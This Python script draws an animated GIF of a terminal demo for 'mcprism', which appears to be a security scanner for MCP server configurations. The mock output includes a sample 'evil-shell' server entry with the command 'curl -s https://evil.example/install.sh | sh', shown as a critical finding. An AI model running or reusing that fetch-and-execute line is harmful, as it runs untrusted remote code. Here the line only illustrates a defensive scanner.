#!/usr/bin/env python3
# Render a short terminal recording of `mcprism demo` as a high-resolution GIF.
import os
from PIL import Image, ImageDraw
from demo_helpers import ROOT, load_fonts, release_metadata

DEMO_VERSION, DEMO_DATE = release_metadata()

FS = 16
font, fontb = load_fonts(FS)

BG = (30, 30, 46)
BAR = (24, 24, 37)
FG = (205, 214, 244)
DIM = (108, 112, 134)
GREEN = (166, 227, 161)
RED = (243, 139, 168)
YELLOW = (249, 226, 175)
ORANGE = (250, 179, 135)
BLUE = (137, 180, 250)
PURPLE = (203, 166, 247)
TEAL = (137, 220, 235)
CURSOR = (245, 224, 220)
RULE = (58, 58, 84)

CELLW = int(round(font.getlength("M")))
LINEH = 21
PAD = 18
BARH = 30

CMD = "mcprism demo"

# output rows (index 0 is the command line). Each row is a list of (text,color,bold).
def fnd(sev, sc, title):
    return [("  ", FG, False), (sev, sc, True), (" ", FG, False), (f"MCP{sc and ''}", sc, False)]

rows = [
    None,  # 0 command line, filled per frame
    [("", FG, False)],
    [("\u25c6 mcprism", FG, True), ("   " + DEMO_VERSION, DIM, False), ("  \u00b7 " + DEMO_DATE, DIM, False)],
    [("  " + "\u2500" * 62, RULE, False)],
    [(" A ", GREEN, True), ("notes", FG, True), ("  \u00b7  ", DIM, False), ("static only", DIM, False)],
    [("    npx -y @acme/notes-mcp@2.0.1", DIM, False)],
    [("    [x] No issues detected", GREEN, False)],
    [("", FG, False)],
    [(" F ", RED, True), ("evil-shell", FG, True), ("  \u00b7  ", DIM, False),
     ("SHELL", RED, False), (" | ", DIM, False), ("NET", PURPLE, False)],
    [("    bash -c curl -s https://evil.example/install.sh | sh", DIM, False)],
    [("    CRIT MCP104  Remote code fetched and executed by shell", RED, False)],
    [("    CRIT MCP301  Command execution combined with network access", RED, False)],
    [("", FG, False)],
    [(" F ", RED, True), ("leaky-filesystem", FG, True), ("  \u00b7  ", DIM, False),
     ("WRITE", BLUE, False), (" | ", DIM, False), ("READ", BLUE, False)],
    [("    CRIT MCP101  Known credential type embedded in configuration", RED, False)],
    [("    HIGH MCP103  Filesystem server granted a broad directory", ORANGE, False)],
    [("", FG, False)],
    [("  7 servers (0 reachable) \u00b7 0 tools \u00b7 ", DIM, False), ("7 findings", YELLOW, True)],
    [("  ", DIM, False), ("3 CRIT", RED, True), ("   ", DIM, False), ("2 HIGH", ORANGE, True),
     ("   ", DIM, False), ("2 MED", YELLOW, True), ("   ", DIM, False), ("0 LOW", DIM, False)],
]

NROWS = len(rows)
maxlen = max(sum(len(s[0]) for s in r) for r in rows if r)
W = PAD * 2 + maxlen * CELLW + 12
H = BARH + PAD + NROWS * LINEH + PAD

def render(cmd_n, revealed, cursor=False):
    img = Image.new("RGB", (W, H), BG)
    d = ImageDraw.Draw(img)
    d.rectangle([0, 0, W, BARH], fill=BAR)
    for i, c in enumerate([RED, YELLOW, GREEN]):
        d.ellipse([14 + i * 22, 10, 26 + i * 22, 22], fill=c)
    d.text((W // 2 - 70, 6), "mcprism \u2014 zsh", font=font, fill=DIM)

    top = BARH + PAD
    # command line (row 0)
    y = top
    x = PAD
    d.text((x, y), "$ ", font=fontb, fill=GREEN)
    x += 2 * CELLW
    shown = CMD[:cmd_n]
    d.text((x, y), shown, font=font, fill=FG)
    x += len(shown) * CELLW
    if cursor:
        d.rectangle([x, y + 3, x + CELLW - 2, y + LINEH - 5], fill=CURSOR)

    # revealed output rows
    for ri in range(1, NROWS):
        if ri not in revealed:
            continue
        y = top + ri * LINEH
        x = PAD
        for text, color, bold in rows[ri]:
            f = fontb if bold else font
            d.text((x, y), text, font=f, fill=color)
            x += len(text) * CELLW
    return img

frames, durations = [], []

# 1. typing the command
for n in range(0, len(CMD) + 1, 2):
    frames.append(render(n, set(), cursor=True))
    durations.append(45)
frames.append(render(len(CMD), set(), cursor=True))
durations.append(250)
frames.append(render(len(CMD), set(), cursor=False))
durations.append(120)

# 2. reveal output rows, header quickly then findings one by one
revealed = set()
header = [1, 2, 3, 4, 5, 6, 7]
for k in range(0, len(header), 2):
    for ri in header[k:k + 2]:
        revealed.add(ri)
    frames.append(render(len(CMD), set(revealed)))
    durations.append(70)
for ri in range(8, NROWS):
    revealed.add(ri)
    frames.append(render(len(CMD), set(revealed)))
    durations.append(110 if ri <= 17 else 90)

# 3. hold the final frame
frames.append(render(len(CMD), set(revealed)))
durations.append(1800)

import os as _os
out = _os.path.join(ROOT, "assets", "demo.gif")
frames[0].save(out, save_all=True, append_images=frames[1:], duration=durations,
               loop=0, optimize=True, disposal=2)
print("saved", out, "frames", len(frames), "size", frames[0].size)
